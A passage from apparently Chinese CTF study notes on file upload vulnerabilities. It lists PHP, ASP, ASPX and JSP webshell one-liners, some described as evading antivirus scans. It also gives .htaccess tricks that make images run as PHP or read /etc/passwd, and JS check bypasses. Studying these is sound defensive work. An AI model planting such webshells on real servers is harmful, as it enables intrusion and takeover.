+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[email]/e&#34;</span><span class="p">,</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;h&#39;</span><span class="p">],</span><span class="s2">&#34;error&#34;</span><span class="p">);</span><span class="err">?</span><span class="o">&gt;/*</span><span class="err">使用这个后</span><span class="p">,</span><span class="err">使用菜刀一句话客户端在配置连接的时候在</span><span class="s2">&#34;配置&#34;</span><span class="err">一栏输入</span><span class="o">*/</span><span class="p">:</span><span class="o">&lt;</span><span class="n">O</span><span class="o">&gt;</span><span class="n">h</span><span class="o">=</span><span class="err">@</span><span class="n">eval_r</span><span class="p">(</span><span class="o">$</span><span class="n">_POST1</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">O</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="err">`</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">]</span><span class="err">`</span> <span class="err">?</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span> <span class="n">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;</span><span class="err">@</span><span class="n">eval_r</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="n">sb</span><span class="p">])</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span> <span class="o">//</span><span class="err">绕过</span><span class="o">&lt;</span><span class="err">?限制的一句话</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="p">(])</span><span class="err">?</span><span class="o">&gt;</span>   <span class="err">上面这句是防杀防扫的！网上很少人用！可以插在网页任何</span><span class="n">ASP文件的最底部不会出错</span><span class="err">，比如</span> <span class="n">index</span><span class="o">.</span><span class="n">asp里面也是可以的</span><span class="err">！</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">])){</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">]);}</span><span class="err">?</span><span class="o">&gt;&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">system</span> <span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="err">加了判断的</span><span class="n">PHP一句话</span><span class="err">，与上面的</span><span class="n">ASP一句话相同道理</span><span class="err">，也是可以插在任何</span><span class="n">PHP文件</span> <span class="err">的最底部不会出错！</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="n">execute</span> <span class="n">request</span><span class="p">(</span><span class="err">“</span><span class="k">class</span><span class="err">”</span><span class="p">)</span><span class="o">%&gt;&lt;%</span><span class="s1">&#39;&lt;</span><span class="si">% lo</span><span class="s1">op &lt;%:%&gt;&lt;%&#39;</span><span class="o">&lt;%</span> <span class="n">loop</span> <span class="o">&lt;%</span><span class="p">:</span><span class="o">%&gt;&lt;%</span><span class="n">execute</span> <span class="n">request</span> <span class="p">(</span><span class="err">“</span><span class="k">class</span><span class="err">”</span><span class="p">)</span><span class="o">%&gt;&lt;%</span><span class="n">execute</span> <span class="n">request</span><span class="p">(</span><span class="err">“</span><span class="k">class</span><span class="err">”</span><span class="p">)</span><span class="s1">&#39;&lt;</span><span class="si">% lo</span><span class="s1">op &lt;%:%&gt; </span>
+</span></span><span class="line"><span class="cl"><span class="err">无防下载表，有防下载表可尝试插入以下语句突破的一句话</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="n">eval</span><span class="p">(</span><span class="n">request</span><span class="p">(</span><span class="err">“</span><span class="mi">1</span><span class="err">″</span><span class="p">)):</span><span class="n">response</span><span class="o">.</span><span class="n">end</span><span class="o">%&gt;</span> <span class="err">备份专用</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="jsp" class="heading-element"><span>JSP</span>
+  <a href="#jsp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%if(request.getParameter(&#34;f&#34;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&#34;\\&#34;)+request.getParameter(&#34;f&#34;))).write (request.getParameter(&#34;t&#34;).getBytes());%&gt; 
+</span></span><span class="line"><span class="cl">提交客户端 
+</span></span><span class="line"><span class="cl">&lt;form action=&#34;&#34; method=&#34;post&#34;&gt;&lt;textareaname=&#34;t&#34;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&#34;submit&#34;value=&#34;提交&#34;&gt;&lt;/form&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="asp" class="heading-element"><span>ASP</span>
+  <a href="#asp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%eval(Request.Item[&#34;r00ts&#34;],”unsafe”);%&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;%IfRequest(“1″)&lt;&gt;”&#34;ThenExecuteGlobal(Request(“1″))%&gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;%execute(request(“1″))%&gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用&#39;&lt;,&gt;‘的asp一句话 </span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="aspx" class="heading-element"><span>ASPX</span>
+  <a href="#aspx" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;script language=&#34;C#&#34;runat=&#34;server&#34;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&#34;add6bb58e139be10&#34;)&lt;/script&gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞产生原因" class="heading-element"><span>漏洞产生原因</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e4%ba%a7%e7%94%9f%e5%8e%9f%e5%9b%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li>
+<li>对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查</li>
+<li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）</li>
+<li>对于web server对于上传文件或者指定目录的行为没有做限制</li>
+</ul>
+<h2 id="常见安全问题" class="heading-element"><span>常见安全问题</span>
+  <a href="#%e5%b8%b8%e8%a7%81%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代码执行;</li>
+<li>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</li>
+<li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</li>
+<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈</li>
+</ul>
+<p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)&ldquo;执行此脚本;等</p>
+<h2 id="web做题" class="heading-element"><span>Web做题！！</span>
+  <a href="#web%e5%81%9a%e9%a2%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
+<p>重要部分捏🎄</p>
+</blockquote>
+<h3 id="常见文件后缀" class="heading-element"><span>常见文件后缀</span>
+  <a href="#%e5%b8%b8%e8%a7%81%e6%96%87%e4%bb%b6%e5%90%8e%e7%bc%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><table>
+  <thead>
+      <tr>
+          <th>文件后缀</th>
+          <th>Mime类型</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>.flv</td>
+          <td>flv/flv-flash</td>
+          <td>在线播放</td>
+      </tr>
+      <tr>
+          <td>.html或.htm</td>
+          <td>text/html</td>
+          <td>超文本标记语言文本</td>
+      </tr>
+      <tr>
+          <td>.rtf</td>
+          <td>application/rtf</td>
+          <td>RTF文本</td>
+      </tr>
+      <tr>
+          <td>.gif 或.png</td>
+          <td>image/gif (image/png)</td>
+          <td>GIF图形/PNG图片</td>
+      </tr>
+      <tr>
+          <td>.jpeg或.jpg</td>
+          <td>image/jpeg</td>
+          <td>JPEG图形</td>
+      </tr>
+      <tr>
+          <td>.au</td>
+          <td>audio/basic</td>
+          <td>au声音文件</td>
+      </tr>
+      <tr>
+          <td>.mid或.midi</td>
+          <td>audio/midi 或 audio/x-midi</td>
+          <td>MIDI音乐文件</td>
+      </tr>
+      <tr>
+          <td>.ra或.ram或.rm</td>
+          <td>audio/x-pn-realaudio</td>
+          <td>RealAudio音乐文件</td>
+      </tr>
+      <tr>
+          <td>.mpg或.mpeg或.mp3</td>
+          <td>video/mpeg</td>
+          <td>MPEG文件</td>
+      </tr>
+      <tr>
+          <td>.avi</td>
+          <td>video/x-msvideo</td>
+          <td>AVI文件</td>
+      </tr>
+      <tr>
+          <td>.gz</td>
+          <td>application/x-gzip</td>
+          <td>GZIP文件</td>
+      </tr>
+      <tr>
+          <td>.tar</td>
+          <td>application/x-tar</td>
+          <td>TAR文件</td>
+      </tr>
+      <tr>
+          <td>.exe</td>
+          <td>application/octet-stream</td>
+          <td>下载文件类型</td>
+      </tr>
+      <tr>
+          <td>.rmvb</td>
+          <td>video/vnd.rn-realvideo</td>
+          <td>在线播放</td>
+      </tr>
+      <tr>
+          <td>.txt</td>
+          <td>text/plain</td>
+          <td>普通文本</td>
+      </tr>
+      <tr>
+          <td>.mrp</td>
+          <td>application/octet-stream</td>
+          <td>MRP文件（国内普遍的手机）</td>
+      </tr>
+      <tr>
+          <td>.ipa</td>
+          <td>application/iphone-package-archive</td>
+          <td>IPA文件 (IPHONE)</td>
+      </tr>
+      <tr>
+          <td>.deb</td>
+          <td>application/x-debian-package-archive</td>
+          <td>DEB文件 (IPHONE)</td>
+      </tr>
+      <tr>
+          <td>.apk</td>
+          <td>application/vnd.android.package-archive</td>
+          <td>APK文件 (安卓系统)</td>
+      </tr>
+      <tr>
+          <td>.cab</td>
+          <td>application/vnd.cab-com-archive</td>
+          <td>CAB文件 (Windows Mobile)</td>
+      </tr>
+      <tr>
+          <td>.xap</td>
+          <td>application/x-silverlight-app</td>
+          <td>XAP文件 (Windows Phone 7)</td>
+      </tr>
+      <tr>
+          <td>.sis</td>
+          <td>application/vnd.symbian.install-archive</td>
+          <td>SIS文件 (symbian平台)</td>
+      </tr>
+      <tr>
+          <td>.jar</td>
+          <td>application/java-archive</td>
+          <td>JAR文件 (JAVA平台手机通用格式)</td>
+      </tr>
+      <tr>
+          <td>.jad</td>
+          <td>text/vnd.sun.j2me.app-descriptor</td>
+          <td>JAD文件 (JAVA平台手机通用格式)</td>
+      </tr>
+      <tr>
+          <td>.sisx</td>
+          <td>application/vnd.symbian.epoc/x-sisx-app</td>
+          <td>SISX文件 (symbian平台)</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="客户端检查" class="heading-element"><span>客户端检查</span>
+  <a href="#%e5%ae%a2%e6%88%b7%e7%ab%af%e6%a3%80%e6%9f%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
+<li>
+<p>JS检查</p>
+<ul>
+<li>
+<p>通过浏览器F12很简单的修改文件后缀名就可以完成绕过检查</p>
+</li>
+<li>
+<p>木马修改后缀名后上传，通过改包工具修改上传</p>
+</li>
+<li>
+<p>如果是JS脚本检测，在本地浏览器客户端禁用JS即可。</p>
+<blockquote>
+<p>可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现绕过。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="服务端--检查后缀" class="heading-element"><span>服务端 · 检查后缀</span>
+  <a href="#%e6%9c%8d%e5%8a%a1%e7%ab%af--%e6%a3%80%e6%9f%a5%e5%90%8e%e7%bc%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="黑名单" class="heading-element"><span>黑名单</span>
+  <a href="#%e9%bb%91%e5%90%8d%e5%8d%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ul>
+<li>
+<p>上传特殊后缀</p>
+<ul>
+<li>pht</li>
+</ul>
+</li>
+<li>
+<p><code>.htaccess</code>上传利用</p>
+<ul>
+<li>
+<p>文件解析</p>
+<p>经常出现在文件上传的黑名单没有限制 .htaceess 后缀，通过上传 .htaccess 文件，再上传图片，使图片的 php 恶意代码得以被解析执行。</p>
+<p>一般有一下两种方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 将images.png 当做 PHP 执行
+</span></span><span class="line"><span class="cl">&lt;FilesMatch  &#34;images.png&#34;&gt;
+</span></span><span class="line"><span class="cl">SetHandler  application/x-httpd-php
+</span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 将 .jpg(.xxx) 当做 PHP 文件解析
+</span></span><span class="line"><span class="cl">AddType application/x-httpd-php .jpg(.xxx)</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>文件包含</p>
+<blockquote>
+<p>本地文件包含</p>
+</blockquote>
+<p>通过 php_value 来设置 <code>auto_prepend_file</code>或者 <code>auto_append_file</code> 配置选项包含一些敏感文件，同时<strong>在本目录或子目录中需要有可解析的 php 文件</strong>来触发</p>
+<p>.htaccess 分别通过这两个配置选项来包含 /etc/passwd，并访问同目录下的 index.php文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">auto_prepend_file</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_file /etc/passwd</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>远程文件包含不可以使用.htaccess</p>
+</blockquote>
+<p>PHP 的 all_url_include 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。</p>
+<p>因为 all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启</p>
+</li>
+<li>
+<p>源码泄露</p>
+<p>利用 php_flag 将 engine 设置为 0，在本目录和子目录中关闭 php 解析，造成源码泄露</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_flag engine 0</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>代码执行</p>
+<p>利用伪协议<code>all_url_fopen</code>、<code>all_url_include</code>为on</p>
+<p>解析.htaccess</p>
+<p>.htaccess (base64 / urlencode)</p>
+<p>写单纯的text文件</p>
+<p>.htaccess内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span></span></code></pre></td></tr></table>
+</div>
+</div><p>写执行php命令</p>
+<p>.htaccess内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_file .htaccess #&lt;?php phpinfo();?&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>下面这种适合同目录或子目录没有 php 文件。 需要先设置允许可访问 .htaccess 文件</p>
+<p>.htaccess内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Files ~ &#34;^.ht&#34;&gt;
+</span></span><span class="line"><span class="cl"> Require all granted
+</span></span><span class="line"><span class="cl"> Order allow,deny
+</span></span><span class="line"><span class="cl"> Allow from all
+</span></span><span class="line"><span class="cl">&lt;/Files&gt;
+</span></span><span class="line"><span class="cl">SetHandler application/x-httpd-php
+</span></span><span class="line"><span class="cl"># &lt;?php phpinfo(); ?&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
